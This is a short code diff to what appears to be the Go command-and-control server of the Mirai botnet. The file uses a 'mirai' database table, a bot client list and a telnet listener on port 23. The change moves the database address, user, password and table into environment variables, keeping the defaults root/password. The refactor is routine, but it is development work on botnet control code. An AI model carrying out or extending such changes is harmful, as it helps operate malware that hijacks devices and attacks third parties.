@@ -5,15 +5,40 @@ import (
     "net"
     "errors"
     "time"
+    "os"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
-const DatabaseTable string  = "mirai"
+// Database configuration from environment variables with defaults
+func getDatabaseAddr() string {
+    if addr := os.Getenv("DATABASE_ADDR"); addr != "" {
+        return addr
+    }
+    return "127.0.0.1"
+}
+
+func getDatabaseUser() string {
+    if user := os.Getenv("DATABASE_USER"); user != "" {
+        return user
+    }
+    return "root"
+}
+
+func getDatabasePass() string {
+    if pass := os.Getenv("DATABASE_PASS"); pass != "" {
+        return pass
+    }
+    return "password"
+}
+
+func getDatabaseTable() string {
+    if table := os.Getenv("DATABASE_TABLE"); table != "" {
+        return table
+    }
+    return "mirai"
+}
 
 var clientList *ClientList = NewClientList()
-var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
+var database *Database = NewDatabase(getDatabaseAddr(), getDatabaseUser(), getDatabasePass(), getDatabaseTable())
 
 func main() {
     tel, err := net.Listen("tcp", "0.0.0.0:23")
